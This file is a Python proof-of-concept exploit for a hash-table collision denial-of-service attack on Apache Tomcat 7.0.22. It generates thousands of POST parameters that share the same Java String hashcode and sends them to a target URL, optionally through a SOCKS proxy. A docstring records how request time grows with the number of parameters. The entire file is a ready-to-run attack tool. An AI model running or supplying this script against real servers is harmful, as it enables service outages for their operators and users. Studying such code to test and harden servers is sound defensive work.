#!/usr/bin/python -3
"""
DoS through hash table
----------------------

tomcat 7.0.22.0 (lparams=20)

nparams | request time (s)
--------------------------
 5000                  3.3
10000                 26.0        
20000                 83.5
40000                348.1

ref: http://permalink.gmane.org/gmane.comp.security.full-disclosure/83694
"""
from __future__ import print_function
import os
import optparse
import random
import socket
import sys

def enable_socks4_if_requested(verbose):
    proxy = os.getenv("socks_proxy", '')
    if proxy != '':
        if verbose: 
            print("enabling SOCKS via {0}".format(proxy))
        addr, port = proxy.split(":")
        import socks4
        socks4.socks4socket.PROXY = (addr, int(port))
        socket.socket = socks4.socks4socket
    else:
        if verbose: 
            print("no SOCKS")
        
def random_permutations(collisions, n, random):
    while True:
        yield [random.choice(collisions) for i in range(n)]

def generate_random_parameters(collisions, nparams, lparams):
    generator = random_permutations(collisions, lparams, random.Random()) 
    keys = ["".join(next(generator)) for i in range(nparams)]
    values = range(nparams)
    return dict(zip(keys, values))

def post(url, parameters):
    # workaround python2 vs python3 urllib
    if sys.version_info[0] == 3:
        from urllib.request import urlopen
        from urllib.parse import urlencode
    else:
        from urllib import urlopen
        from urllib import urlencode
    urlencoded_parameters = urlencode(parameters)
    opened_url = urlopen(url, urlencoded_parameters)
    return opened_url.read()

if __name__ == "__main__":
    parser = optparse.OptionParser(version="1.0")
    parser.add_option("-v", dest="verbose", action="store_true", )
    parser.add_option("-n", dest="nparams", default=10000, type=int)
    parser.add_option("-l", dest="lparams", default=20, type=int)
    parser.add_option("-d", dest="dump", action="store_true", help="only output generated parameters")
    (options, args) = parser.parse_args()
    collisions = [ "gq", "hR", "i3" ]
    parameters = generate_random_parameters(collisions, options.nparams, options.lparams)

    if options.dump:
        for parameter in parameters.keys(): 
            print(parameter)
        sys.exit(0)

    if len(args) != 1:
        parser.error("missing target url")

    if options.verbose:
        print("java.lang.String with same hashcode", collisions)
        print("number of parameters", options.nparams)
        print("length of parameters", options.lparams)
        print("unique parameters", len(parameters))

    enable_socks4_if_requested(options.verbose)
    target_url = args[0]
    response_body = post(target_url, parameters)
    if options.verbose:
        print(response_body)

